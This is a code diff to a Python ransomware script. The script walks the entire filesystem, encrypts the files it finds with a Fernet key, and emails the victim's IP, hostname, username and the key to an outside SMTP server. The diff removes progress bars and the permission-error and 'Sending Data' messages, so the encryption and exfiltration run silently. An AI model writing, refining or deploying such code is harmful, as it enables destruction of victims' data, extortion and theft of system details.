@@ -2,8 +2,6 @@ import os, platform, random, smtplib, ssl, socket, shutil, subprocess
 from os import system, name
 from requests import get
 from datetime import datetime
-from progress.bar import Bar
-from progress.spinner import Spinner
 from cryptography.fernet import Fernet
 
 key = Fernet.generate_key()
@@ -69,34 +67,26 @@ def DISPLAY():
     print("ID: {}".format(str(digits)))
     print()
 
+
 def FindFiles():
-    load_state = 0
-    spinner = Spinner('Finding Files ')
-    while load_state != 'FINISHED':
-        f = open("logs/path.txt", "a")
-        cnt = 0
-        for root, dirs, files in os.walk("/"):
-        # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
-                for dir in dirs:
-                    if any(s in root for s in EXCLUDE):
-                        pass
-                        spinner.next()
-                    else:
-                        for file in files:
-                            if file.endswith(EXCLUDE):
-                                cnt += 1
-                                TARGET = os.path.join(root, file)
-                                f.write(TARGET+'\n')
-                                spinner.next()
-                                print(root)
+    f = open("logs/path.txt", "a")
+    cnt = 0
+    for root, dirs, files in os.walk("/"):
+    # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
+        for dir in dirs:
+            if any(s in root for s in EXCLUDE):
+                pass
+            else:
+                for file in files:
+                    if file.endswith(EXCLUDE):
+                        cnt += 1
+                        TARGET = os.path.join(root, file)
+                        f.write(TARGET+'\n')
 
 
-        f.close()
-        load_state = 'FINISHED'
+    f.close()
 
-    print()
-    print("Found {} target files".format(cnt))
-    print()
+
 
 
 
@@ -110,24 +100,21 @@ def encrypt(filename):
 
 
 def StartRansom():
-    DISPLAY()
     FindFiles()
     f = open("logs/cnt.txt", "r")
     cnt = f.read()
     f.close()
-    with Bar('Encrypting', max=int(cnt)) as bar:
-        filepath = 'logs/path.txt'
-        with open(filepath) as fp:
+    filepath = 'logs/path.txt'
+    with open(filepath) as fp:
+        line = fp.readline()
+        while line:
+            filename = line.strip()
+            try:
+                encrypt(filename)
+            except Exception:
+                pass
             line = fp.readline()
-            while line:
-                filename = line.strip()
-                try:
-                    encrypt(filename)
-                except Exception:
-                    print("!Permission denied")
-                    pass
-                line = fp.readline()
-                bar.next()
+
     fp.close()
     print()
     SendData()
@@ -168,7 +155,6 @@ def DecyptMessage(INVALID_KEY):
             try:
                 decrypt(filename)
             except PermissionError:
-                print("!Permission Denied")
                 pass
             except Exception:
                 DecyptMessage(True)
@@ -189,7 +175,6 @@ def SendData():
     id: {}
     key: {}
     """).format(time_now, IP, hostname, username, str(digits), str(key))
-    print("Sending Data")
     context = ssl.create_default_context()
     with smtplib.SMTP(smtp_server, port) as server:
         server.ehlo()  # Can be omitted
